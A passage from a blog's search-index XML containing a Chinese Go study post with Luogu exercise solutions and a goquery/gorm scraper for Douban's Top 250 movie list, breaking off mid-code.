<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>go查漏补缺2.0</title>
    <link href="/2023/11/13/go%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA2-0/"/>
    <url>/2023/11/13/go%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA2-0/</url>
    
    <content type="html"><![CDATA[<p>起因是在看字节青训营的时候刷到了福州大学的一个up的项目视频,跟着评论区偶然发现了他们学校的西二在线工作室的组织仓库,看了golang的学习路线,大为震撼,所以打算跟着学一遍<br><a href="https://github.com/west2-online/">https://github.com/west2-online/</a></p><h1 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h1><h2 id="洛谷"><a href="#洛谷" class="headerlink" title="洛谷"></a>洛谷</h2><h3 id="1046"><a href="#1046" class="headerlink" title="1046"></a>1046</h3><p><a href="https://www.luogu.com.cn/problem/P1046">https://www.luogu.com.cn/problem/P1046</a></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>arr := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">10</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>num := <span class="hljs-number">0</span><br>fmt.Scan(&amp;num)<br>arr = <span class="hljs-built_in">append</span>(arr, num)<br>&#125;<br><span class="hljs-keyword">var</span> h <span class="hljs-type">int</span><br>fmt.Scan(&amp;h)<br>h += <span class="hljs-number">30</span><br>count := <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> arr &#123;<br><span class="hljs-keyword">if</span> v &lt;= h &#123;<br>count++<br>&#125;<br>&#125;<br>fmt.Println(count)<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5737"><a href="#5737" class="headerlink" title="5737"></a>5737</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsLeap</span><span class="hljs-params">(year <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> year%<span class="hljs-number">400</span> == <span class="hljs-number">0</span> || (year%<span class="hljs-number">4</span> == <span class="hljs-number">0</span> &amp;&amp; year%<span class="hljs-number">100</span> != <span class="hljs-number">0</span>)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x, y <span class="hljs-type">int</span><br>fmt.Scan(&amp;x)<br>fmt.Scan(&amp;y)<br>flag := <span class="hljs-literal">false</span><br><span class="hljs-keyword">if</span> x &gt;= <span class="hljs-number">1582</span> &amp;&amp; y &lt;= <span class="hljs-number">3000</span> &amp;&amp; x &lt; y &#123;<br>flag = <span class="hljs-literal">true</span><br>&#125;<br>count := <span class="hljs-number">0</span><br>arr := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, y-x)<br><span class="hljs-keyword">for</span> i := x; i &lt;= y; i++ &#123;<br><span class="hljs-keyword">if</span> IsLeap(i) &amp;&amp; flag &#123;<br>count++<br>arr = <span class="hljs-built_in">append</span>(arr, i)<br>&#125;<br>&#125;<br>fmt.Println(count)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> arr &#123;<br>fmt.Print(v, <span class="hljs-string">&quot; &quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="IsPrime"><a href="#IsPrime" class="headerlink" title="IsPrime"></a>IsPrime</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsPrime</span><span class="hljs-params">(num <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">2</span>; i*i &lt;= num; i++ &#123;<br><span class="hljs-keyword">if</span> num%i == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x <span class="hljs-type">int</span><br>PrimeArr := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">17</span>; i &lt; <span class="hljs-number">1000000</span>; i++ &#123;<br><span class="hljs-keyword">if</span> IsPrime(i) &#123;<br>PrimeArr = <span class="hljs-built_in">append</span>(PrimeArr, i)<br>&#125;<br>&#125;<br>fmt.Scan(&amp;x)<br>flag := <span class="hljs-literal">false</span><br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> PrimeArr &#123;<br><span class="hljs-keyword">if</span> x == v &#123;<br>fmt.Println(<span class="hljs-string">&quot;YES&quot;</span>)<br>flag = <span class="hljs-literal">true</span><br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> !flag &#123;<br>fmt.Println(<span class="hljs-string">&quot;NO&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>跑了200ms….感觉还能优化,没必要创字典</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsPrime</span><span class="hljs-params">(num <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">2</span>; i*i &lt;= num; i++ &#123;<br><span class="hljs-keyword">if</span> num%i == <span class="hljs-number">0</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">false</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">true</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> x <span class="hljs-type">int</span><br>fmt.Scan(&amp;x)<br><span class="hljs-keyword">if</span> IsPrime(x) &#123;<br>fmt.Println(<span class="hljs-string">&quot;YES&quot;</span>)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;NO&quot;</span>)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="114514"><a href="#114514" class="headerlink" title="114514"></a>114514</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs go"><br><span class="hljs-keyword">package</span> main<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">IsMultiple</span><span class="hljs-params">(num <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> num%<span class="hljs-number">3</span> == <span class="hljs-number">0</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>arr := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">60</span>)<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">50</span>; i++ &#123;<br>arr = <span class="hljs-built_in">append</span>(arr, i)<br>&#125;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-built_in">len</span>(arr); i++ &#123;<br><span class="hljs-keyword">if</span> IsMultiple(arr[i]) &#123;<br>arr = <span class="hljs-built_in">append</span>(arr[:i], arr[i+<span class="hljs-number">1</span>:]...)<br>&#125;<br>&#125;<br>arr = <span class="hljs-built_in">append</span>(arr, <span class="hljs-number">114514</span>)<br><span class="hljs-keyword">for</span> _, v := <span class="hljs-keyword">range</span> arr &#123;<br><span class="hljs-built_in">println</span>(v)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="bonus"><a href="#bonus" class="headerlink" title="bonus"></a>bonus</h2><p>本博客</p><h1 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><h3 id="创建请求并发送"><a href="#创建请求并发送" class="headerlink" title="创建请求并发送"></a>创建请求并发送</h3><p>构造客户端 (var client http.Client)<br>构造http请求 (GET POST) http.NewRequest(“GET”,url,nil)<br>设置请求头 </p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-string">&quot;keep-alive&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Pragma&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Cache-Control&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Accept&quot;</span>, <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>)<br>req.Header.<span class="hljs-built_in">Set</span>(<span class="hljs-string">&quot;Accept-Language&quot;</span>, <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>)<br></code></pre></td></tr></table></figure><p>发送请求(defer 关闭连接)<br>client.Do(req)</p><h3 id="选择元素"><a href="#选择元素" class="headerlink" title="选择元素"></a>选择元素</h3><ul>    <li>CSS选择器</li>```go get github.com/PuerkitoBio/goquery```    F12,选择元素,右键,复制,复制selector    <li>XPath语法</li>```go get github.com/antchfx/htmlquery```    F12,选择元素,右键,复制,复制XPath/完整XPath    <li>正则表达式</li>原生regexp不支持Perl语法</ul><h3 id="获取节点信息"><a href="#获取节点信息" class="headerlink" title="获取节点信息"></a>获取节点信息</h3><h3 id="保存到本地-数据库"><a href="#保存到本地-数据库" class="headerlink" title="保存到本地&#x2F;数据库"></a>保存到本地&#x2F;数据库</h3><p>提前定义数据结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(table *Movie)</span></span> TableName() <span class="hljs-type">string</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;movies&quot;</span><br>&#125;<br><span class="hljs-comment">//这里的这个函数的意思是,在创建数据表单时,用movies当作表名(使用DB.AutoMigrate(&amp;Movie&#123;&#125;)时会根据结构体的名字自动创建表名,这里是人为定义一下)</span><br>DB.AutoMigrate(&amp;Movie&#123;&#125;)<br><span class="hljs-comment">//这个是根据结构体自动创建一个表单</span><br></code></pre></td></tr></table></figure><p>在定义gorm的数据库连接对象时,err要提前定义</p><p>在已经定义全区变量<br>var DB *gorm.DB<br>后,如果再<br>DB,err:&#x3D;gorm.Open(mysql.Open(path),&amp;gorm.Config{})<br>这里看似只声明并定义了新变量err,但实际把DB也给覆盖定义了,也就是说这里的DB不再是全局变量DB,而是再初始化数据库连接中的局部变量DB<br>正确方法是<br>var err error<br>DB,err&#x3D;gorm.Open(mysql.Open(path),&amp;gorm.Config{})</p><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;github.com/PuerkitoBio/goquery&quot;</span><br><span class="hljs-string">&quot;gorm.io/driver/mysql&quot;</span><br><span class="hljs-string">&quot;gorm.io/gorm&quot;</span><br><span class="hljs-string">&quot;log&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;strings&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>DB    *gorm.DB<br>count <span class="hljs-type">int</span><br>)<br><br><span class="hljs-keyword">type</span> Movie <span class="hljs-keyword">struct</span> &#123;<br>gorm.Model<br>Title  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;title&quot; gorm:&quot;type:varchar(255);not null;&quot;`</span><br>Img    <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;img&quot; gorm:&quot;type:varchar(256);not null;&quot;`</span><br>Rank   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;rank&quot; gorm:&quot;type:varchar(256);not null;&quot;`</span><br>Desc   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;desc&quot; gorm:&quot;type:varchar(256);not null;&quot;`</span><br>Tags   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;tags&quot;`</span><br>Author <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;author&quot;`</span><br>Actor  <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;actor&quot;`</span><br>Time   <span class="hljs-type">string</span> <span class="hljs-string">`json:&quot;time&quot;`</span><br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>InitDB()<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++ &#123;<br>num := fmt.Sprintf(<span class="hljs-string">&quot;%d&quot;</span>, i*<span class="hljs-number">25</span>)<br>Spider(num)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Err</span><span class="hljs-params">(err <span class="hljs-type">error</span>, str <span class="hljs-type">string</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>log.Fatalln(str, <span class="hljs-string">&quot;is: &quot;</span>, err)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Spider</span><span class="hljs-params">(page <span class="hljs-type">string</span>)</span></span> &#123;<br>client := http.Client&#123;&#125;<br>url := <span class="hljs-string">`https://movie.douban.com/top250?start=`</span><br>req, err := http.NewRequest(<span class="hljs-string">&quot;GET&quot;</span>, url+page, <span class="hljs-literal">nil</span>)<br>Err(err, <span class="hljs-string">&quot;创建连接失败&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Connection&quot;</span>, <span class="hljs-string">&quot;keep-alive&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Pragma&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Cache-Control&quot;</span>, <span class="hljs-string">&quot;no-cache&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Upgrade-Insecure-Requests&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Content-Type&quot;</span>, <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;User-Agent&quot;</span>, <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Accept&quot;</span>, <span class="hljs-string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>)<br>req.Header.Set(<span class="hljs-string">&quot;Accept-Language&quot;</span>, <span class="hljs-string">&quot;zh-CN,zh;q=0.9&quot;</span>)<br><br>resp, err := client.Do(req)<br>Err(err, <span class="hljs-string">&quot;请求连接失败&quot;</span>)<br><br><span class="hljs-comment">//解析网页</span><br>docs, err := goquery.NewDocumentFromReader(resp.Body)<br><br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>Err(err, <span class="hljs-string">&quot;解析网页失败&quot;</span>)<br><br><span class="hljs-comment">//获取节点信息</span><br><span class="hljs-comment">//#content &gt; div &gt; div.article &gt; ol &gt; li:nth-child(1) &gt; div &gt; div.info &gt; div.hd &gt; a &gt; span:nth-child(1)</span><br>docs.Find(<span class="hljs-string">&quot;#content &gt; div &gt; div.article &gt; ol &gt; li&quot;</span>).<br>Each(<span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i <span class="hljs-type">int</span>, s *goquery.Selection)</span></span> &#123;<br>title := s.Find(<span class="hljs-string">&quot;div &gt; div.info &gt; div.hd &gt; a &gt; span:nth-child(1)&quot;</span>).Text()<br>imgTag := s.Find(<span class="hljs-string">&quot;div &gt; div.pic &gt; a &gt; img&quot;</span>)<br>img, ok := imgTag.Attr(<span class="hljs-string">&quot;src&quot;</span>)<br>info := s.Find(<span class="hljs-string">&quot;div &gt; div.info &gt; div.bd &gt; p:nth-child(1)&quot;</span>).Text()<br>rank := s.Find(<span class="hljs-string">&quot;div &gt; div.info &gt; div.bd &gt; div &gt; span.rating_num&quot;</span>).Text()<br>desc := s.Find(<span class="hljs-string">&quot;div &gt; div.info &gt; div.bd &gt; p.quote &gt; span&quot;</span>).Text()<br><span class="hljs-keyword">if</span> ok &#123;<br>count++<br>author, actor, time, tags := InfoSplit(info)<br><span class="hljs-keyword">if</span> title == <span class="hljs-string">&quot;&quot;</span> &#123;<br>title = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> img == <span class="hljs-string">&quot;&quot;</span> &#123;<br>img = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> author == <span class="hljs-string">&quot;&quot;</span> &#123;<br>author = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> actor == <span class="hljs-string">&quot;&quot;</span> &#123;<br>actor = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> time == <span class="hljs-string">&quot;&quot;</span> &#123;<br>time = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> tags == <span class="hljs-string">&quot;&quot;</span> &#123;<br>tags = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> rank == <span class="hljs-string">&quot;&quot;</span> &#123;<br>rank = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br><span class="hljs-keyword">if</span> desc == <span class="hljs-string">&quot;&quot;</span> &#123;<br>desc = <span class="hljs-string">&quot;none&quot;</span><br>&#125;<br>data := Movie&#123;<br>Title:  title,<br>Img:    img,<br>Author: author,<br>Actor:  actor,<br>Time:   time,<br>Tags:   tags,<br>Rank:   rank,<br>Desc:   desc,<br>&#125;<br>InsertDB(&amp;data)<br>fmt.Println(data)<br>&#125;<br>&#125;)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InfoSplit</span><span class="hljs-params">(info <span class="hljs-type">string</span>)</span></span> (author, actor, time, tags <span class="hljs-type">string</span>) &#123;<br><span class="hljs-comment">//电影导演</span><br>authorRe, err := regexp.Compile(<span class="hljs-string">`导演:.*   `</span>)<br>Err(err, <span class="hljs-string">&quot;电影导演错误&quot;</span>)<br>author = <span class="hljs-type">string</span>(authorRe.Find([]<span class="hljs-type">byte</span>(info)))<br>author = strings.TrimPrefix(author, <span class="hljs-string">&quot;导演:&quot;</span>)<br>author = strings.TrimSpace(author)<br><br><span class="hljs-comment">//电影演员</span><br>actorRe, err := regexp.Compile(<span class="hljs-string">`主演:(.*)`</span>)<br>Err(err, <span class="hljs-string">&quot;电影演员错误&quot;</span>)<br>actor = <span class="hljs-type">string</span>(actorRe.Find([]<span class="hljs-type">byte</span>(info)))<br>actor = strings.TrimPrefix(actor, <span class="hljs-string">&quot;主演:&quot;</span>)<br>parts := strings.Split(actor, <span class="hljs-string">&quot;/&quot;</span>)<br>actor = parts[<span class="hljs-number">0</span>]<br>actor = strings.TrimSpace(actor)<br><br><span class="hljs-comment">//电影时间</span><br>timeRe, err := regexp.Compile(<span class="hljs-string">`(\d+)`</span>)<br>Err(err, <span class="hljs-string">&quot;电影时间错误&quot;</span>)<br>time = <span class="hljs-type">string</span>(timeRe.Find([]<span class="hljs-type">byte</span>(info)))<br>time = strings.TrimSpace(time)<br><br><span class="hljs-comment">//电影标签</span><br>tagsRe, err := regexp.Compile(<span class="hljs-string">`/([^\/]+)$`</span>)<br>Err(err, <span class="hljs-string">&quot;电影标签错误&quot;</span>)<br>tags = <span class="hljs-type">string</span>(tagsRe.Find([]<span class="hljs-type">byte</span>(info)))<br>tags = strings.TrimSpace(tags)<br><br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">InitDB</span><span class="hljs-params">()</span></span> &#123;<br>path := <span class="hljs-string">&quot;root:root@tcp(127.0.0.1:3306)/douban?charset=utf8mb4&amp;parseTime=True&amp;loc=Local&quot;</span><br><span class="hljs-keyword">var</span> err <span class="hljs-type">error</span><br>DB, err = gorm.Open(mysql.Open(path), 